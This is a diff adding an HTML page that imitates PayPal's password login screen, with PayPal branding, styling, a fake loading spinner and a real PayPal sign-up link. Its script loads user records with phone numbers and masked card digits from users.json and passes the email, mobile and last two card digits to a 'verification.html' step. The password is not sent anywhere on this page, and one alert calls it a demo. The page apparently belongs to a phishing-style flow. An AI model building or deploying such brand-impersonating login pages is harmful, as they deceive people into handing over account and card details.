@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>PayPal - Password</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+html, body { height:100%; margin:0; padding:0; }
+
+body {
+  display:flex;
+  flex-direction:column;
+  min-height:100%;
+  font-family:-apple-system, BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;
+  background:#ffffff; color:#111;
+}
+
+.wrap {
+  max-width:420px;
+  margin:0 auto;
+  padding:32px 20px 0;
+  flex:1;
+}
+
+/* PayPal logo */
+.logo {
+  font-size:34px;
+  font-weight:700;
+  text-align:center;
+  margin-top:24px;
+  margin-bottom:60px;
+}
+
+/* EMAIL ROW */
+.email-row {
+  text-align:center;
+  font-size:15px;
+  margin-bottom:36px;
+  margin-top:0;
+  line-height:1.2;
+  word-break:break-word;
+}
+
+.email-row .email {
+  color:#222;
+  font-weight:600;
+  font-size:16px;
+  display:inline-block;
+  vertical-align:middle;
+}
+
+.email-row .change {
+  color:#0b76e6;
+  margin-left:12px;
+  text-decoration:none;
+  font-weight:600;
+  font-size:15px;
+  vertical-align:middle;
+}
+
+/* PASSWORD FIELD */
+.password-container {
+  margin-top:8px;
+}
+
+.password-box {
+  border:1px solid #cfcfcf;
+  border-radius:10px;
+  padding:14px 18px 8px 18px;
+  position: relative;
+  box-sizing:border-box;
+  min-height:64px;
+  margin-left: -12px;
+  margin-right: -12px;
+  width: calc(100% + 24px);
+}
+
+.password-label {
+  color:#8d8d8d;
+  font-size:13px;
+  font-weight:400;
+  display:block;
+  margin-bottom:2px;
+  pointer-events:none;
+}
+
+.password-input {
+  border:none;
+  outline:none;
+  width:100%;
+  font-size:17px;
+  background:transparent;
+  padding:0;
+  color:#111;
+}
+
+/* Show button */
+.show-link {
+  position:absolute;
+  right:18px;
+  top: 24px;
+  color:#034FB3;
+  font-size:14px;
+  font-weight:600;
+  cursor:pointer;
+  user-select:none;
+  padding:8px 12px;
+  margin-right:-12px;
+  margin-top: -2px;
+}
+
+/* FORGOT LINK */
+.forgot {
+  /* Match "Forgot password?" link color to #156ECA (RGB 21,110,202) */
+  color:#156ECA;
+  font-size:17px;
+  font-weight:600;
+  margin-top:10px;
+  display:inline-block;
+}
+
+/* PRIMARY BUTTON */
+.btn-primary {
+  background:#0250B4;
+  color:#fff;
+  border:none;
+  width:100%;
+  padding:15px 0;
+  margin-top:28px;
+  border-radius:999px;
+  font-size:17px;
+  font-weight:600;
+  cursor:pointer;
+  margin-left: -12px;
+  margin-right: -12px;
+  width: calc(100% + 24px);
+}
+
+/* DIVIDER - reduced gaps around "or" */
+.divider {
+  display:flex;
+  align-items:center;
+  margin:16px 0;
+}
+
+.divider::before,
+.divider::after {
+  content:"";
+  flex:1;
+  height:1px;
+  background:#ddd;
+}
+
+.divider span {
+  margin:0 16px;
+  color:#6f6f6f;
+  font-size:15px;
+}
+
+/* SIGN UP BUTTON - reduced top gap */
+.btn-outline {
+  width:100%;
+  padding:15px 0;
+  border-radius:999px;
+  border:1.5px solid #000;
+  background:#fff;
+  font-size:17px;
+  font-weight:600;
+  color:#333333;
+  cursor:pointer;
+  margin-top:12px;
+}
+
+/* LANGUAGE ROW - reduced top/bottom gaps for tighter mobile feel */
+.lang-row {
+  display:flex;
+  align-items:center;
+  gap:6px;
+  margin-top:24px;
+  margin-bottom:16px;
+  font-size:15px;
+  justify-content:center;
+  flex-wrap:wrap;
+}
+
+.flag { width:22px; }
+.chevron { font-size:14px; font-weight:bold; margin-left:2px; }
+.lang-row span { color:#333; }
+.divider-sm { color:#d0d0d0; padding:0 6px; }
+
+/* FOOTER - tighter spacing between links + reduced padding */
+.footer {
+  background:#f5f5f7;
+  padding:6px 10px;
+  font-size:12.5px;
+  text-align:center;
+  color:#6E7072;
+  font-weight:500;
+  line-height:1.4;
+  width:100%;
+  margin:0;
+  white-space:normal;
+  display:flex;
+  flex-wrap:wrap;
+  justify-content:center;
+  /* Close gaps for a more standard mobile footer */
+  gap:2px 8px;
+}
+
+.footer a {
+  display:inline-block;
+  margin:0;
+  padding:0 2px;
+  color:#6E7072;
+  text-decoration:none;
+  font-weight:500;
+}
+
+/* SPINNER OVERLAY */
+.spinner-overlay {
+  position:fixed;
+  inset:0;
+  background-color:rgba(255,255,255,0.45);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+  visibility:hidden;
+  opacity:0;
+  transition:opacity 0.25s ease;
+  backdrop-filter:blur(2px);
+}
+
+.spinner-overlay.show {
+  visibility:visible;
+  opacity:1;
+}
+
+.spinner-container {
+  position:relative;
+  width: 132px;
+  height: 132px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* PayPal-style indeterminate arc (moderate speed) */
+.spinner {
+  width: 132px;
+  height: 132px;
+}
+
+.spinner .track {
+  stroke: rgba(0,112,186,0.14);
+  stroke-width:4;
+  fill:none;
+}
+
+.spinner .indicator {
+  stroke:#0070BA;
+  stroke-width:4;
+  fill:none;
+  stroke-linecap:round;
+  stroke-dasharray: 160;
+  stroke-dashoffset: 120;
+  animation: spinner-dash 1.6s ease-in-out infinite;
+}
+
+.spinner {
+  animation: spinner-rotate 1.6s linear infinite;
+  transform-origin: 50% 50%;
+}
+
+.lock-on-spinner {
+  position:absolute;
+  width: 50px;
+  height: 50px;
+  color:#8d8d8d;
+  opacity:0.75;
+}
+
+@keyframes spinner-rotate {
+  100% { transform: rotate(360deg); }
+}
+
+@keyframes spinner-dash {
+  0%   { stroke-dashoffset: 120; }
+  50%  { stroke-dashoffset: 40;  }
+  100% { stroke-dashoffset: 120; }
+}
+</style>
+</head>
+<body>
+
+<!-- SPINNER OVERLAY -->
+<div class="spinner-overlay" id="spinnerOverlay">
+  <div class="spinner-container">
+    <svg class="spinner" viewBox="0 0 100 100" aria-label="Loading" role="img">
+      <circle class="track" cx="50" cy="50" r="36"></circle>
+      <circle class="indicator" cx="50" cy="50" r="36"></circle>
+    </svg>
+    <span class="lock-on-spinner">
+      <svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M19 11H5C3.89543 11 3 11.8954 3 13V20C3 21.1046 3.89543 22 5 22H19C20.1046 22 21 21.1046 21 20V13C21 11.8954 20.1046 11 19 11Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+        <path d="M7 11V7C7 4.23858 9.23858 2 12 2C14.7614 2 17 4.23858 17 7V11" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+      </svg>
+    </span>
+  </div>
+</div>
+
+<div class="wrap">
+  <div class="logo">PayPal</div>
+
+  <div class="email-row" aria-live="polite">
+    <span class="email" id="emailText">example@gmail.com</span>
+    <a href="#" id="changeLink" class="change">Change</a>
+  </div>
+
+  <div class="password-container">
+    <div class="password-box">
+      <div class="password-label">Enter your password</div>
+      <input id="passwordInput" type="password" class="password-input"
+             autocomplete="current-password" aria-label="Password">
+      <span id="showToggle" class="show-link">Show</span>
+    </div>
+  </div>
+
+  <a href="forgotpassword.html" class="forgot">Forgot password?</a>
+
+  <button id="loginBtn" class="btn-primary" type="button">Log In</button>
+
+  <div class="divider"><span>or</span></div>
+
+  <button id="signupBtn" class="btn-outline" type="button">Sign Up</button>
+
+  <div class="lang-row">
+    <img src="https://flagcdn.com/us.svg" class="flag" alt="US flag">
+    <span class="chevron">⌄</span>
+    <span style="font-weight:600;">English</span>
+    <span class="divider-sm">|</span>
+    <span>Français</span>
+    <span class="divider-sm">|</span>
+    <span>Español</span>
+    <span class="divider-sm">|</span>
+    <span>中文</span>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Contact Us</a>
+  <a href="#">Privacy</a>
+  <a href="#">Legal</a>
+  <a href="#">Policy Updates</a>
+  <a href="#">Worldwide</a>
+</div>
+
+<script>
+(function() {
+  const params = new URLSearchParams(window.location.search);
+  const emailFromParam = params.get('email');
+  const storedEmail = localStorage.getItem('pp_email');
+
+  const emailSpan = document.getElementById('emailText');
+  const changeLink = document.getElementById('changeLink');
+  const loginBtn = document.getElementById('loginBtn');
+  const signupBtn = document.getElementById('signupBtn');
+  const spinnerOverlay = document.getElementById('spinnerOverlay');
+  const passwordInput = document.getElementById('passwordInput');
+  const showToggle = document.getElementById('showToggle');
+
+  function safeParse(json) {
+    try { return JSON.parse(json); } catch { return null; }
+  }
+
+  function extractLast2FromMasked(masked) {
+    // users.json has values like: x••••••19
+    const m = String(masked || '').match(/(\d{2})\s*$/);
+    return m ? m[1] : '';
+  }
+
+  function applyUser(user) {
+    if (!user) return;
+    if (user.email) {
+      localStorage.setItem('pp_email', user.email);
+      emailSpan.textContent = user.email;
+    }
+    // Keep a single “current user” in localStorage for the next pages
+    localStorage.setItem('pp_user', JSON.stringify(user));
+    if (user.mobile1) localStorage.setItem('pp_mobile', user.mobile1);
+
+    const last2 = extractLast2FromMasked(user.card1) || extractLast2FromMasked(user.card2);
+    if (last2) localStorage.setItem('pp_last2', last2);
+  }
+
+  async function loadUser(preferredEmail) {
+    // 1) If we already have a stored user, use it if it matches
+    const storedUser = safeParse(localStorage.getItem('pp_user') || '');
+    if (storedUser && storedUser.email && (!preferredEmail || storedUser.email === preferredEmail)) {
+      applyUser(storedUser);
+      return storedUser;
+    }
+
+    // 2) Otherwise, pull from users.json
+    try {
+      const res = await fetch('users.json', { cache: 'no-store' });
+      const data = await res.json();
+      const users = Array.isArray(data.users) ? data.users : [];
+      const found = preferredEmail
+        ? users.find(u => (u.email || '').toLowerCase() === String(preferredEmail).toLowerCase())
+        : null;
+      const user = found || users[0] || null;
+      applyUser(user);
+      return user;
+    } catch {
+      // fall back to just email
+      if (preferredEmail) {
+        applyUser({ email: preferredEmail });
+        return { email: preferredEmail };
+      }
+      if (storedEmail) {
+        applyUser({ email: storedEmail });
+        return { email: storedEmail };
+      }
+      return null;
+    }
+  }
+
+  const initialEmail = emailFromParam ? decodeURIComponent(emailFromParam) : storedEmail;
+  if (initialEmail) {
+    localStorage.setItem('pp_email', initialEmail);
+    emailSpan.textContent = initialEmail;
+  }
+
+  // Ensure we hydrate pp_user / pp_mobile / pp_last2 for downstream pages
+  loadUser(initialEmail);
+
+  changeLink.addEventListener('click', function(e) {
+    e.preventDefault();
+    const current = localStorage.getItem('pp_email') || '';
+    // Keep your existing behavior, but preserve the email
+    window.location.href = 'home.html?email=' + encodeURIComponent(current);
+  });
+
+  showToggle.addEventListener('click', function(e) {
+    e.preventDefault();
+    if (passwordInput.type === 'password') {
+      passwordInput.type = 'text';
+      showToggle.textContent = 'Hide';
+    } else {
+      passwordInput.type = 'password';
+      showToggle.textContent = 'Show';
+    }
+  });
+
+  signupBtn.addEventListener('click', function() {
+    window.location.href = 'https://www.paypal.com/us/webapps/mpp/account-selection';
+  });
+
+  loginBtn.addEventListener('click', async function() {
+    const pwd = passwordInput.value.trim();
+    if (!pwd) {
+      alert('Please enter your password (demo only).');
+      return;
+    }
+
+    const currentEmail = localStorage.getItem('pp_email') || initialEmail || '';
+    const user = await loadUser(currentEmail);
+
+    // build params for the next pages
+    const mobile = (user && user.mobile1) || localStorage.getItem('pp_mobile') || '';
+    const last2 = (user && (extractLast2FromMasked(user.card1) || extractLast2FromMasked(user.card2))) || localStorage.getItem('pp_last2') || '';
+
+    spinnerOverlay.classList.add('show');
+    setTimeout(() => {
+      const qs = new URLSearchParams();
+      if (currentEmail) qs.set('email', currentEmail);
+      if (mobile) qs.set('mobile', mobile);
+      if (last2) qs.set('last2', last2);
+      window.location.href = 'verification.html?' + qs.toString();
+    }, 2000);
+  });
+})();
+</script>
+
+</body>
+</html>
